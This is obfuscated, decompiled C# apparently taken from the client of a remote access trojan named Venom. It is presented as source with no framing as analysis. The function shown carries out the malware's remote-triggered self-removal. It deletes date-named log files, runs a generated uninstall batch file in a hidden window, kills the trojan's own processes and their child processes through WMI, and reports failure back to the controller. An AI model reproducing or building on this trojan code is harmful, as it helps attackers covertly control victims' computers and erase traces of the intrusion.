using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using VenomC.Chaos.Packets.Clt;

public static class GClass32
{
	[CompilerGenerated]
	private sealed class Class41
	{
		public Regex regex_0;

		public Func<string, bool> func_0;

		internal bool method_0(string path)
		{
			return regex_0.IsMatch(Path.GetFileName(path));
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class42
	{
		public static readonly Class42 class42_0 = new Class42();

		public static Func<Process, bool> func_0;

		public static Func<Process, bool> func_1;

		internal bool method_0(Process pr)
		{
			return pr.ProcessName == "Venom";
		}

		internal bool method_1(Process pr)
		{
			return pr.ProcessName == "VenomRemote";
		}
	}

	public static void smethod_0(GClass13 client)
	{
		try
		{
			if (GClass5.bool_3)
			{
				GClass39.smethod_9();
			}
			if (GClass5.bool_3)
			{
				Task.Run((Action)GClass47.smethod_10).Wait();
			}
			if (GClass5.bool_5 && Directory.Exists(GClass5.string_11))
			{
				Regex regex_0 = new Regex("^\\d{4}\\-(0[1-9]|1[012])\\-(0[1-9]|[12][0-9]|3[01])$");
				foreach (string item in (from path in Directory.GetFiles(GClass5.string_11, "*", SearchOption.TopDirectoryOnly)
					where regex_0.IsMatch(Path.GetFileName(path))
					select path).ToList())
				{
					try
					{
						File.Delete(item);
					}
					catch (Exception)
					{
					}
				}
			}
			string text = GClass47.smethod_12(GClass5.bool_0 && GClass5.bool_4);
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception("Could not create uninstall-batch file");
			}
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = text
			};
			Process.Start(startInfo);
			string fileName = GClass1.smethod_0(Application.get_ExecutablePath());
			new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = fileName
			};
			Process.Start(startInfo);
			foreach (Process item2 in from pr in Process.GetProcesses()
				where pr.ProcessName == "Venom"
				select pr)
			{
				item2.Kill();
			}
			foreach (Process item3 in from pr in Process.GetProcesses()
				where pr.ProcessName == "VenomRemote"
				select pr)
			{
				item3.Kill();
			}
			Task.Run((Action)GClass47.smethod_11).Wait();
			Task.Run((Action)GClass47.smethod_8).Wait();
			Task.Run((Action)GClass47.smethod_9).Wait();
			smethod_1(Process.GetCurrentProcess().Id);
			Class12.gclass14_0.method_21();
		}
		catch (Exception ex2)
		{
			new SetStatus($"Uninstallation failed: {ex2.Message}").Execute(client);
		}
	}

	private static void smethod_1(int pid)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid).Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				smethod_1(Convert.ToInt32(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("ProcessID")));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		try
		{
			Process.GetProcessById(pid).Kill();
		}
		catch (ArgumentException)
		{
		}
	}
}
